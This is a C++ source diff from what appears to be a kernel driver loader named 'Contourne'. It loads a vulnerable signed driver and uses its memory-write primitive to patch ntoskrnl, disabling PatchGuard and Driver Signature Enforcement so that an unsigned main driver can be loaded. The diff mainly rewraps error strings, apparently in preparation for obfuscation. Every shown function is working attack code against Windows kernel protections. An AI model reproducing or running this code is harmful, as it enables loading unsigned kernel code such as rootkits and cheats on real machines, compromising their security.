@@ -35,7 +35,6 @@ namespace Contourne
         auto return_offset = KernelUtils::get_return_offset();
         auto patch_gaurd_value_offset = KernelUtils::get_patch_gaurd_value_offset();
         auto patch_gaurd_offset = KernelUtils::get_patch_gaurd_offset();
-
         if (!ntoskrnl_base.has_value() ||
             !se_validate_image_data_offset.has_value() ||
             !se_validate_image_header_offset.has_value() ||
@@ -43,10 +42,9 @@ namespace Contourne
             !patch_gaurd_value_offset.has_value() ||
             !patch_gaurd_offset.has_value())
         {
-            std::cerr << "[ERROR] One or more offsets are invalid.\n";
+            std::cerr <<  (" [ERROR] One or more offsets are invalid.\n");
             return false;
         }
-
         NtoskrnlBaseAddress = ntoskrnl_base.value();
         SeValidateImageDataOffset = se_validate_image_data_offset.value();
         SeValidateImageHeaderOffset = se_validate_image_header_offset.value();
@@ -60,19 +58,16 @@ namespace Contourne
     bool disable_dse()
     {
         ULONG64 return_address_offset = NtoskrnlBaseAddress + RetOffset;
-
         if (!Secure::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageHeaderOffset, &return_address_offset, sizeof(return_address_offset)))
         {
-            std::cerr << "[ERROR] Failed to patch Header Offset. Error code: " << GetLastError() << "\n";
+            std::cerr <<  (" [ERROR] Failed to patch Header Offset. Error code: ") << GetLastError() <<  ("\n");
             return false;
         }
-
         if (!Secure::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + SeValidateImageDataOffset, &return_address_offset, sizeof(return_address_offset)))
         {
-            std::cerr << "[ERROR] Failed to patch Data Offset. Error code: " << GetLastError() << "\n";
+            std::cerr <<  (" [ERROR] Failed to patch Data Offset. Error code: ") << GetLastError() <<  ("\n");
             return false;
         }
-
         return true;
     }
 
@@ -80,13 +75,11 @@ namespace Contourne
     {
         ULONG64 return_address_offset = NtoskrnlBaseAddress + RetOffset;
         ULONG64 patch_gaurd_value_address = NtoskrnlBaseAddress + PatchgaurdValueOffset;
-
         if (!Secure::WriteVirtualMemory(VulnurableDriverHandle, NtoskrnlBaseAddress + PatchgaurdOffset, &patch_gaurd_value_address, 8))
         {
-            std::cerr << "[ERROR] Failed to disable PG. Error code : " << GetLastError() << std::endl;
+            std::cerr <<  (" [ERROR] Failed to disable PG. Error code : ") << GetLastError() << std::endl;
             return false;
         }
-
         return true;
     }
 
@@ -95,18 +88,16 @@ namespace Contourne
         auto [load_status, service_name] = driver::load(pdfw_krnl_bytes, pdfw_krnl_size, pdfw_krnl_service_name);
         if (!NT_SUCCESS(load_status))
         {
-            std::cerr << "[ERROR] Failed to load vuld.\n";
+            std::cerr <<  (" [ERROR] Failed to load vuld.\n");
             return false;
         }
-
         VulnurableDriverHandle = CreateFileA((LPCSTR)("\\\\.\\" + service_name).c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
         if (VulnurableDriverHandle == INVALID_HANDLE_VALUE || !VulnurableDriverHandle)
         {
-            std::cerr << "[ERROR] Failed to get a valid handle to the device driver. Error Code: " << GetLastError() << "\n";
+            std::cerr <<  (" [ERROR] Failed to get a valid handle to the device driver. Error Code: ") << GetLastError() <<  ("\n");
             driver::unload(service_name);
             return false;
         }
-
         return true;
     }
 
@@ -116,26 +107,23 @@ namespace Contourne
     {
         if (!load_vuld(k_pdfw_krnl_bytes, k_pdfw_krnl_size, pdfw_krnl_service_name))
         {
-            std::cerr << "[ERROR] Failed loading vuld.\n";
+            std::cerr <<  (" [ERROR] Failed loading vuld.\n");
             return Status::FAILED_LOADING_VULN;
         }
-
         if (!disable_pg())
         {
-            std::cerr << "[ERROR] Failed disabling PG.\n";
+            std::cerr <<  (" [ERROR] Failed disabling PG.\n");
             driver::unload(pdfw_krnl_service_name);
             return Status::FAILED_DISABLE_PG;
         }
-
         if (!disable_dse())
         {
-            std::cerr << "[ERROR] Failed disabling DSE.\n";
+            std::cerr <<  (" [ERROR] Failed disabling DSE.\n");
             driver::unload(pdfw_krnl_service_name);
             return Status::FAILED_DISABLED_SE;
         }
 
         auto [load_status, service_name] = driver::load(k_driver_bytes, k_driver_size, driver_service_name);
-
 
         if (!NT_SUCCESS(load_status))
         {
@@ -150,14 +138,14 @@ namespace Contourne
                 std::tie(load_status, service_name) = driver::load(k_driver_bytes, k_driver_size, driver_service_name);
                 if (!NT_SUCCESS(load_status))
                 {
-                    std::cerr << "[ERROR] Failed loading main driver after unload attempt, exiting.\n";
+                    std::cerr <<  (" [ERROR] Failed loading main driver after unload attempt, exiting.\n");
                     driver::unload(pdfw_krnl_service_name);
                     return Status::FAILED_LOADING_DRV;
                 }
             }
             else
             {
-                std::cerr << "[ERROR] Failed loading main driver on the first attempt , exiting.\n";
+                std::cerr <<  (" [ERROR] Failed loading main driver on the first attempt , exiting.\n");
                 driver::unload(pdfw_krnl_service_name);
                 return Status::FAILED_LOADING_DRV;
             }
@@ -168,23 +156,22 @@ namespace Contourne
         return Status::SUCCESS;
     }
 
-
     std::string status_to_string(Status status)
     {
         switch (status)
         {
         case Status::FAILED_LOADING_VULN:
-            return "Failed loading Vuld";
+            return  ("Failed loading Vuld");
         case Status::FAILED_DISABLE_PG:
-            return "Failed Disabling PG";
+            return  ("Failed Disabling PG");
         case Status::FAILED_DISABLED_SE:
-            return "Failed Disabling DSE";
+            return  ("Failed Disabling DSE");
         case Status::FAILED_LOADING_DRV:
-            return "Failed Loading Main Driver";
+            return  ("Failed Loading Main Driver");
         case Status::SUCCESS:
-            return "Success";
+            return  ("Success");
         default:
-            return "Unknown Status, assuming success";
+            return  ("Unknown Status, assuming success");
         }
     }
 }
